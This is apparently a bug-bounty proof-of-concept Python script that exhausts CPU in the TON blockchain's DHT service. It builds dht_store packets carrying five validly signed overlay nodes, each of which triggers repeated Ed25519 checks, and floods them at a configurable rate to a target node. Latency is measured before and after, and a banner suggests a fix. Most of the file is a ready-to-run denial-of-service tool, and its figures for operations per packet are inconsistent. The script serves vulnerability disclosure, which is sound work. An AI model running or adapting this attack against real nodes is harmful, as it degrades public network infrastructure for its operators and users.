#!/usr/bin/env python3
"""
PoC: TON DHT CPU Exhaustion via dht_store / DhtUpdateRuleOverlayNodes::check_value

Vulnerability: DhtUpdateRuleOverlayNodes::check_value() — dht/dht-types.cpp:282
  - Called 2× per incoming dht_store (4× on UPDATE path)
  - Performs N unchecked Ed25519 verifications per call (no bound on node count)
  - No per-source-IP rate limit at the DHT query level
  - N=5 valid-signed nodes fit in the 768-byte value limit → 10 Ed25519 ops/packet

Attack: Send crafted dht_store packets containing 5 overlay.node entries, each
        with a valid Ed25519 signature. The DHT actor (single-threaded) spends
        ~50–100 µs per Ed25519 op × 10 ops = 0.5–1 ms of pure crypto per packet,
        while ADNL allows 227 pps per source IP → 114–228 ms CPU load per IP·s
        → 5–7 source IPs saturate one DHT core completely.

Bug bounty scope: C++ core / DHT layer
Reported under: https://github.com/ton-blockchain/bug-bounty
"""

import argparse
import asyncio
import hashlib
import os
import struct
import time
from typing import List

from nacl.signing import SigningKey
from pytoniq_core.tl.generator import TlGenerator

# ---------------------------------------------------------------------------
# TL constructor IDs (verified against pytoniq_core/tl/schemas/ton_api.tl)
# ---------------------------------------------------------------------------
TL_PUB_ED25519           = 0x4813b4c6   # pub.ed25519 key:int256
TL_DHT_UPD_OVERLAY_NODES = 0x26779383   # dht.updateRule.overlayNodes (empty)
TL_OVERLAY_NODE_TOSIGN   = 0x03d8a8e1   # overlay.node.toSign …

_TL_SCHEMAS: TlGenerator.with_default_schemas().__class__ | None = None


def _get_tl() -> object:
    global _TL_SCHEMAS
    if _TL_SCHEMAS is None:
        _TL_SCHEMAS = TlGenerator.with_default_schemas().generate()
    return _TL_SCHEMAS


# ---------------------------------------------------------------------------
# Payload builders
# ---------------------------------------------------------------------------

def compute_overlay_short_id(overlay_name: bytes) -> bytes:
    """SHA256 of boxed pub.overlay — used as dht.key.id and overlay.node.overlay."""
    tl = _get_tl()
    boxed = tl.serialize(tl.get_by_name('pub.overlay'), {'name': overlay_name}, boxed=True)
    return hashlib.sha256(boxed).digest()


def make_overlay_node(short_id: bytes, version: int = 1) -> dict:
    """
    Generate one overlay.node with a fresh Ed25519 keypair and a valid signature.

    Signing format (72 bytes) — matches C++ serialize_tl_object(overlay_node_toSign):
        LE(0x03d8a8e1)[4]  overlay.node.toSign tag
        adnl_id_short[32]  SHA256(LE(0x4813b4c6) || pubkey)   ← bare adnl.id.short
        overlay[32]        must equal short_id
        version[4 LE]
    """
    sk = SigningKey(os.urandom(32))
    pk_bytes = bytes(sk.verify_key)
    adnl_id_short = hashlib.sha256(
        struct.pack('<I', TL_PUB_ED25519) + pk_bytes
    ).digest()
    to_sign = (
        struct.pack('<I', TL_OVERLAY_NODE_TOSIGN)
        + adnl_id_short
        + short_id
        + struct.pack('<i', version)
    )
    signature = bytes(sk.sign(to_sign).signature)
    return {
        'id': {'@type': 'pub.ed25519', 'key': pk_bytes.hex()},
        'overlay': short_id.hex(),
        'version': version,
        'signature': signature,
    }


def build_malicious_dht_store(overlay_name: bytes | None = None, num_nodes: int = 5) -> bytes:
    """
    Serialize a dht_store that triggers maximum CPU work in the DHT actor.

    Call chain on the receiving node (DhtMemberImpl, single-threaded):
      DhtValue::create(tl, check_sig=true)          → check_value() call #1  ← N Ed25519 verifs
        └─ DhtValue::create(DhtKeyDescription, …)  → key.check() + check_value()
      store_in()  → value.check()                   → key.check() + check_value() call #2
    Total: 2 × N Ed25519 verifications per packet  (N=5 → 10 ops/packet).

    No cryptographic key needed for dht.keyDescription.signature because
    EncryptorOverlay::check_signature() (encryptor.hpp:109) just validates
    structure — it performs zero actual crypto.
    """
    if overlay_name is None:
        overlay_name = os.urandom(32)

    tl = _get_tl()
    short_id = compute_overlay_short_id(overlay_name)

    nodes = [make_overlay_node(short_id) for _ in range(num_nodes)]
    nodes_bytes: bytes = tl.serialize(
        tl.get_by_name('overlay.nodes'), {'nodes': nodes}, boxed=True
    )
    assert len(nodes_bytes) <= 768, f"nodes payload too large: {len(nodes_bytes)} > 768"

    # dht.keyDescription with pub.overlay id — EncryptorOverlay accepts empty signature
    keydesc = {
        'key': {'id': short_id.hex(), 'name': b'nodes', 'idx': 0},
        'id': {'@type': 'pub.overlay', 'name': overlay_name},
        'update_rule': {'@type': 'dht.updateRule.overlayNodes'},
        'signature': b'',   # EncryptorOverlay::check_signature requires empty sig
    }
    dht_value = {
        'key': keydesc,
        'value': nodes_bytes,
        'ttl': int(time.time()) + 3600,
        'signature': b'',   # DhtUpdateRuleOverlayNodes::check_value requires empty sig
    }
    return tl.serialize(tl.get_by_name('dht.store'), {'value': dht_value}, boxed=True)


# ---------------------------------------------------------------------------
# ADNL sending
# ---------------------------------------------------------------------------

async def _send_packet_nowait(transport: object, peer: object, payload: bytes) -> None:
    """
    Send a dht_store packet without blocking for the response.

    pytoniq's send_message_in_channel() does:
        1. _prepare_packet_content_msg()  — synchronous
        2. channel.encrypt()              — synchronous
        3. self.transport.sendto()        — synchronous UDP write
        4. await self._receive(futures)   — waits for server reply

    We cancel after step 3 by wrapping in wait_for(timeout=0.05).
    The UDP packet is already on the wire before the cancellation fires.
    """
    from pytoniq_core.crypto.ciphers import get_random  # type: ignore[import-untyped]

    msg = {
        'message': {
            '@type': 'adnl.message.query',
            'query_id': get_random(32),
            'query': payload,
        }
    }
    try:
        await asyncio.wait_for(
            transport.send_message_in_channel(msg, None, peer),
            timeout=0.05,
        )
    except (asyncio.TimeoutError, Exception):
        pass


async def measure_ping_latency(host: str, port: int, pubkey_b64: str,
                                count: int = 10) -> List[float]:
    """Return RTTs (ms) for dht.ping messages, inf on timeout."""
    from pytoniq.adnl.adnl import AdnlTransport, Node  # type: ignore[import-untyped]

    transport = AdnlTransport(timeout=5)
    peer = Node(host, port, pubkey_b64, transport)
    await transport.start()
    try:
        await peer.connect()
    except Exception as exc:
        print(f"[!] Connection failed: {exc}")
        await transport.close()
        return []

    rtts: List[float] = []
    for _ in range(count):
        t0 = time.monotonic()
        try:
            await peer.send_ping()
            rtts.append((time.monotonic() - t0) * 1000)
        except asyncio.TimeoutError:
            rtts.append(float('inf'))
        await asyncio.sleep(0.5)

    await peer.disconnect()
    await transport.close()
    return rtts


async def run_attack(host: str, port: int, pubkey_b64: str,
                     payloads: List[bytes], rate: float) -> dict:
    """Send pre-built payloads to target at the given rate."""
    from pytoniq.adnl.adnl import AdnlTransport, Node  # type: ignore[import-untyped]

    transport = AdnlTransport(timeout=3)
    peer = Node(host, port, pubkey_b64, transport)
    await transport.start()
    try:
        await peer.connect()
    except Exception as exc:
        print(f"[!] Connection failed: {exc}")
        await transport.close()
        return {}

    print(f"[+] Connected to {host}:{port}")
    interval = 1.0 / rate
    sent = 0
    t_start = time.monotonic()

    for payload in payloads:
        t0 = time.monotonic()
        await _send_packet_nowait(transport, peer, payload)
        sent += 1
        elapsed = time.monotonic() - t0
        remaining = interval - elapsed
        if remaining > 0:
            await asyncio.sleep(remaining)

    duration = time.monotonic() - t_start
    actual_rate = sent / duration if duration > 0 else 0
    print(f"[+] Sent {sent} packets in {duration:.1f}s ({actual_rate:.1f} pps actual)")

    try:
        await peer.disconnect()
    except Exception:
        pass
    await transport.close()
    return {'sent': sent, 'duration': duration, 'rate': actual_rate}


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------

def _print_banner() -> None:
    print("""
┌─────────────────────────────────────────────────────────────────────────┐
│  TON DHT – CPU Exhaustion via DhtUpdateRuleOverlayNodes::check_value    │
├─────────────────────────────────────────────────────────────────────────┤
│  File:    dht/dht-types.cpp:282                                         │
│  Bug:     check_value() called 2× per dht_store with N unbounded        │
│           Ed25519 verifications, no pre-check on node count, no         │
│           per-IP rate limit at DHT query level.                         │
│                                                                         │
│  Max N:   5 valid-signed overlay.nodes fit in 768-byte value limit      │
│           → 2 calls × 5 nodes × 2 EVP ops = 20 EVP_PKEY ops/pkt        │
│  Impact:  @227 pps/IP: ~4540 Ed25519-eq ops/s  ≈ 0.34 CPU-s/IP-s      │
│           ~3-7 source IPs saturate one DHT core (single-threaded)      │
│                                                                         │
│  Fix:     Before the loop add:                                          │
│             if (L->nodes_.size() > MAX_NODES) return protoviolation;   │
│           Deduplicate check_value calls in create/store_in path.        │
│           Add per-IP rate limit at DHT query dispatch.                  │
└─────────────────────────────────────────────────────────────────────────┘
""")


def _fmt_rtts(rtts: List[float]) -> str:
    valid = [r for r in rtts if r != float('inf')]
    timeouts = rtts.count(float('inf'))
    if not valid:
        return f"ALL {len(rtts)} TIMED OUT"
    avg = sum(valid) / len(valid)
    return (f"min={min(valid):.0f}ms avg={avg:.0f}ms max={max(valid):.0f}ms "
            f"timeouts={timeouts}/{len(rtts)}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

async def _async_main() -> None:
    parser = argparse.ArgumentParser(
        description='TON DHT CPU exhaustion PoC — bug bounty demonstration')
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', type=int, required=True)
    parser.add_argument('--pubkey', required=True, metavar='B64',
                        help='Node Ed25519 public key (base64)')
    parser.add_argument('--count', type=int, default=200,
                        help='Packets to send (default 200)')
    parser.add_argument('--rate', type=float, default=200.0,
                        help='Packets/second (default 200; ADNL hard limit ~227)')
    parser.add_argument('--nodes', type=int, default=5,
                        help='overlay.node entries per packet (1-5, default 5)')
    parser.add_argument('--baseline', action='store_true',
                        help='Measure ping latency before and after the attack')
    parser.add_argument('--dry-run', action='store_true',
                        help='Serialize payload only, print sizes, no network')
    args = parser.parse_args()

    _print_banner()

    if args.dry_run:
        print("[*] Dry-run: building one malicious payload …")
        payload = build_malicious_dht_store(num_nodes=args.nodes)
        print(f"    dht.store payload  : {len(payload)} bytes")
        print(f"    overlay.nodes value: ≤768 bytes (hard limit in C++)")
        print(f"    Ed25519 ops/packet : {args.nodes} nodes × 2 calls = {args.nodes*2}")
        cpu_pct = args.nodes * 2 * args.rate * 75e-6 * 100
        print(f"    CPU load @{args.rate:.0f} pps  : ~{cpu_pct:.0f}% of one DHT core")
        return

    if args.baseline:
        print(f"[*] Measuring baseline latency …")
        rtts_before = await measure_ping_latency(
            args.host, args.port, args.pubkey, count=10)
        if rtts_before:
            print(f"    Before: {_fmt_rtts(rtts_before)}")

    print(f"\n[*] Pre-generating {args.count} payloads ({args.nodes} nodes each) …")
    payloads: List[bytes] = []
    for i in range(args.count):
        payloads.append(build_malicious_dht_store(num_nodes=args.nodes))
        if (i + 1) % 100 == 0:
            print(f"    {i+1}/{args.count} ready")
    print(f"    Done. Each payload: {len(payloads[0])} bytes")

    print(f"\n[*] Starting attack: {args.count} pkts at {args.rate:.0f} pps"
          f" → {args.host}:{args.port}")
    _ = await run_attack(args.host, args.port, args.pubkey,
                         payloads, rate=args.rate)

    if args.baseline:
        print(f"\n[*] Post-attack latency …")
        rtts_after = await measure_ping_latency(
            args.host, args.port, args.pubkey, count=10)
        if rtts_after:
            print(f"    After:  {_fmt_rtts(rtts_after)}")


def main() -> None:
    asyncio.run(_async_main())


if __name__ == '__main__':
    main()
